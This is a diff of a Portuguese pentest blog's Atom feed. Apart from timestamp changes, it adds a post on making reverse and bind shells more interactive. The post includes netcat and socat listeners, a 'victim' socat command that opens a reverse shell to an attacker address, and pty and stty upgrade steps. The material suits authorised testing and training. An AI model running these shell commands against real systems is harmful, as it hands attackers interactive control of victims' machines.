@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://raphaelsander.github.io/my-docs/blog</id>
     <title>My-Docs Blog</title>
-    <updated>2026-06-15T00:27:59.000Z</updated>
+    <updated>2026-06-15T23:37:42.000Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://raphaelsander.github.io/my-docs/blog"/>
     <subtitle>My-Docs Blog</subtitle>
@@ -11,7 +11,7 @@
         <title type="html"><![CDATA[Extraindo Usuários do Gitea]]></title>
         <id>https://raphaelsander.github.io/my-docs/blog/gitea_users_exfiltration</id>
         <link href="https://raphaelsander.github.io/my-docs/blog/gitea_users_exfiltration"/>
-        <updated>2026-06-15T00:27:59.000Z</updated>
+        <updated>2026-06-15T23:37:42.000Z</updated>
         <summary type="html"><![CDATA[Como extrair usuários do Gitea DB e como quebrá-los via brute force.]]></summary>
         <content type="html"><![CDATA[<p>Quando ganhamos acesso a um <em>host</em> porém precisamos escalar privilégios e
 conseguir acesso à autenticação de usuário com permissões mais elevadas pode ser
@@ -81,7 +81,7 @@ definido.</p>
         <title type="html"><![CDATA[GPU CUDA no WSL]]></title>
         <id>https://raphaelsander.github.io/my-docs/blog/gpu_cuda_in_wsl</id>
         <link href="https://raphaelsander.github.io/my-docs/blog/gpu_cuda_in_wsl"/>
-        <updated>2026-06-15T00:27:59.000Z</updated>
+        <updated>2026-06-15T23:37:42.000Z</updated>
         <summary type="html"><![CDATA[Como instalar os drivers CUDA no WSL para brute foce utilizando o Hashcat.]]></summary>
         <content type="html"><![CDATA[<p><img decoding="async" loading="lazy" alt="wsl_plus_nvidia_cuda" src="https://raphaelsander.github.io/my-docs/assets/images/wsl_plus_nvidia_cuda-bae54f5c858fcd193c3ed14c60955566.png" width="526" height="200" class="img_ev3q"></p>
 <p>Durante a execução de pentests, é comum utilizar máquinas virtuais para
@@ -123,7 +123,7 @@ por exemplo, com aceleração GPU CUDA:</p>
         <title type="html"><![CDATA[Pentest Flow]]></title>
         <id>https://raphaelsander.github.io/my-docs/blog/pentest_flow</id>
         <link href="https://raphaelsander.github.io/my-docs/blog/pentest_flow"/>
-        <updated>2026-06-15T00:27:59.000Z</updated>
+        <updated>2026-06-15T23:37:42.000Z</updated>
         <summary type="html"><![CDATA[Check list de tudo que deveria ser validado em um Pentest.]]></summary>
         <content type="html"><![CDATA[<p>Durante a execução do Pentest é comum se perder ou esquecer de determinada
 enumeração ou teste, o que pode impactar no resultado final, já que qualquer
@@ -251,7 +251,7 @@ vez que algo novo ou melhorias surgirem.</p>
         <title type="html"><![CDATA[Codificando Remotamente com SSH e VSCode]]></title>
         <id>https://raphaelsander.github.io/my-docs/blog/remote_code_vscode</id>
         <link href="https://raphaelsander.github.io/my-docs/blog/remote_code_vscode"/>
-        <updated>2026-06-15T00:27:59.000Z</updated>
+        <updated>2026-06-15T23:37:42.000Z</updated>
         <summary type="html"><![CDATA[Como codificar remotamente utilizando o VSCode via SSH.]]></summary>
         <content type="html"><![CDATA[<p>É comum precisarmos editar códigos que ficam hospedados em ambientes Linux
 devido à praticidade de ferramentas como Docker e builds mais rápidos, mas ao
@@ -318,5 +318,63 @@ conexão remota ativa, o terminal do Linux fica disponível diretamente.</p>]]><
         <category label="vscode" term="vscode"/>
         <category label="ide" term="ide"/>
         <category label="ssh" term="ssh"/>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Melhorias em SHELL]]></title>
+        <id>https://raphaelsander.github.io/my-docs/blog/shell_improvements</id>
+        <link href="https://raphaelsander.github.io/my-docs/blog/shell_improvements"/>
+        <updated>2026-06-15T23:37:42.000Z</updated>
+        <summary type="html"><![CDATA[Dicas para melhorar a experiência em reverse/bind shells.]]></summary>
+        <content type="html"><![CDATA[<p>Pequenas melhorias na shell são importantes em pentests porque tornam bind e reverse
+shells mais estáveis, interativas e fáceis de usar, especialmente quando se precisa
+executar comandos complexos ou transferir arquivos.</p>
+<!-- -->
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="rlwrap-para-reverse-shells"><code>rlwrap</code> para Reverse Shells<a href="https://raphaelsander.github.io/my-docs/blog/shell_improvements#rlwrap-para-reverse-shells" class="hash-link" aria-label="Link direto para rlwrap-para-reverse-shells" title="Link direto para rlwrap-para-reverse-shells" translate="no">​</a></h2>
+<p>O <code>rlwrap</code> é uma ferramenta que adiciona recursos de edição de linha e histórico
+a programas que não os possuem, como <code>nc</code>. Ele é especialmente útil para reverse
+shells, pois permite que você use as setas do teclado para navegar pelo histórico
+de comandos e edite comandos anteriores, tornando a experiência mais fluida.</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rlwrap -cAr nc -lvnp 4444</span><br></span></code></pre></div></div>
+<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>informação</div><div class="admonitionContent_BuS1"><p><strong>Opções do <code>rlwrap</code></strong>:</p><ul>
+<li class=""><code>-c</code>: Completa nome de arquivos e diretórios.</li>
+<li class=""><code>-A</code>: ANSII colour, útil para destacar comandos e saídas.</li>
+<li class=""><code>-r</code>: Aprende palavras que aparecem tanto na entrada quanto na saída do programa
+encapsulado e as adicione automaticamente à lista de autocompletar.</li>
+</ul><p><strong>Opções do <code>nc</code></strong>:</p><ul>
+<li class=""><code>-l</code>: Modo listen, aguarda conexões de entrada.</li>
+<li class=""><code>-v</code>: Modo verboso, exibe informações adicionais.</li>
+<li class=""><code>-n</code>: Desativa a resolução de nomes DNS.</li>
+<li class=""><code>-p</code>: Especifica o número da porta para escutar.</li>
+</ul></div></div>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="pseudo-terminal-com-python">Pseudo Terminal com Python<a href="https://raphaelsander.github.io/my-docs/blog/shell_improvements#pseudo-terminal-com-python" class="hash-link" aria-label="Link direto para Pseudo Terminal com Python" title="Link direto para Pseudo Terminal com Python" translate="no">​</a></h2>
+<p>Às vezes, quando você obtém uma reverse ou bind shell, ela pode ser limitada em
+termos de interatividade. Para melhorar isso, você pode usar o seguinte comando
+para spawnar uma shell mais interativa:</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># ou</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="utilizando-socat-para-reverse-e-bind-shells">Utilizando <code>socat</code> para Reverse e Bind Shells<a href="https://raphaelsander.github.io/my-docs/blog/shell_improvements#utilizando-socat-para-reverse-e-bind-shells" class="hash-link" aria-label="Link direto para utilizando-socat-para-reverse-e-bind-shells" title="Link direto para utilizando-socat-para-reverse-e-bind-shells" translate="no">​</a></h2>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Listener</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br></span></code></pre></div></div>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Victim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="term---variável-de-ambiente"><code>TERM</code> - Variável de Ambiente<a href="https://raphaelsander.github.io/my-docs/blog/shell_improvements#term---vari%C3%A1vel-de-ambiente" class="hash-link" aria-label="Link direto para term---variável-de-ambiente" title="Link direto para term---variável-de-ambiente" translate="no">​</a></h2>
+<p>A variável de ambiente <code>TERM</code> é usada para informar ao sistema o tipo de terminal
+que está sendo usado. Definir <code>TERM</code> para <code>xterm</code> ou <code>xterm-256color</code> pode melhorar
+a compatibilidade e a funcionalidade da shell, especialmente quando se trata de
+recursos como cores, formatação e controle de cursor, mas principalmente permite
+o uso do comando <code>clear</code> para limpar a tela, o que é muito útil durante um pentest.</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">export TERM=xterm</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="melhorando-a-experiência-com-stty">Melhorando a Experiência com <code>stty</code><a href="https://raphaelsander.github.io/my-docs/blog/shell_improvements#melhorando-a-experi%C3%AAncia-com-stty" class="hash-link" aria-label="Link direto para melhorando-a-experiência-com-stty" title="Link direto para melhorando-a-experiência-com-stty" translate="no">​</a></h2>
+<p>O comando <code>stty</code> é usado para configurar as opções do terminal. Configurar <code>stty</code>
+para <code>raw</code> e <code>echo</code> para <code>0</code> pode melhorar a experiência em reverse e bind shells
+ao permitir que a shell seja mais responsiva e interativa, especialmente quando
+se trata de comandos que exigem entrada do usuário ou quando se deseja evitar que
+os comandos digitados sejam exibidos na tela.</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Na bind/reverse shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c 'import pty; pty.spawn("/bin/bash")'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ctrl-Z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># No Kali/máquina atacante</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ stty raw -echo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ fg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Na bind/reverse shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ reset</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ export SHELL=bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ export TERM=xterm-256color</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></span></code></pre></div></div>]]></content>
+        <author>
+            <name>Raphael Sander</name>
+            <uri>https://github.com/raphaelsander</uri>
+        </author>
+        <category label="pentest" term="pentest"/>
+        <category label="shell" term="shell"/>
+        <category label="reverse_shell" term="reverse_shell"/>
+        <category label="bind_shell" term="bind_shell"/>
     </entry>
 </feed>
